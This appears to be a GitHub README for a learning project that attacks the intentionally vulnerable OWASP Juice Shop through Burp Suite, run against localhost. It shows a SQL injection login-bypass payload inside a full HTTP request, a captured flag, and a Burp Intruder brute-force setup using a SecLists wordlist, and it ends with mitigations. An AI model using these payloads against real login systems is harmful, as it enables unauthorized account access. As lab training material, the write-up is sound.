# OWASP-Top-10

This project is a hands-on deep dive into common web application vulnerabilities from the [OWASP Top 10](https://owasp.org/www-project-top-ten/), tested against the intentionally vulnerable [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/). All testing was performed using [Burp Suite Community Edition](https://portswigger.net/burp) as the main interception, manipulation, and automation tool.

It includes detailed exploitation of vulnerabilities like **SQL Injection** and **Brute-Force Attacks**, along with request payloads, screenshots, and takeaways.

---

## Tools & Stack

| Tool             | Use Case                                 |
|------------------|-------------------------------------------|
| **Burp Suite**   | Intercept, modify, and replay web traffic |
| **Juice Shop**   | Vulnerable web app to test against        |
| **Kali Linux**   | Testing environment (VM)                  |
| **SecLists**     | Password brute-force payloads             |
| **Firefox**      | Proxy-connected browser                   |

---

## Vulnerabilities Covered

### 1. SQL Injection – Admin Login Bypass

- **Payload used:**
  ```sql
  ' OR 1=1--

POST /rest/user/login HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json

{
  "email": "' OR 1=1--",
  "password": "irrelevant"
}
Result: Gained unauthorized access to the admin panel without credentials.

Flag earned: 32a5e0f21372bcc1000a6088b93b458e41f0e02a

Brute-Force Attack – Admin Password
Context: After logging in via SQLi, the real password remained unknown.

Approach:

Found the admin email in a product review.

Intercepted login request and configured Burp Intruder.

Loaded payloads from:

swift
Copy
Edit
/usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt
Observed responses for 200 OK instead of 401 Unauthorized.

📸 Screenshots
<details> <summary><strong>Click to expand</strong></summary>
🔹 SQLi Intercept in Burp

![Screenshot 2025-07-07 073928](https://github.com/user-attachments/assets/9c965911-a4df-4669-8e44-980d3c7c099a)
![Screenshot 2025-07-07 073949](https://github.com/user-attachments/assets/5d637db0-037d-41c5-a6a2-902013b391a2)


🔹 Brute Force Payloads in Intruder
![Screenshot 2025-07-07 082142](https://github.com/user-attachments/assets/77bc1628-0fd6-44f2-9799-21283c2903fa)
![Screenshot 2025-07-07 075307](https://github.com/user-attachments/assets/8f8b178e-bc17-4358-9877-8009a75ecf13)


</details>
How These Issues Should Be Mitigated
SQL Injection:

Use prepared statements or parameterized queries

Sanitize and validate all input

Brute Force:

Rate-limit login attempts

Lock accounts after multiple failed logins

Use MFA and alerting mechanisms
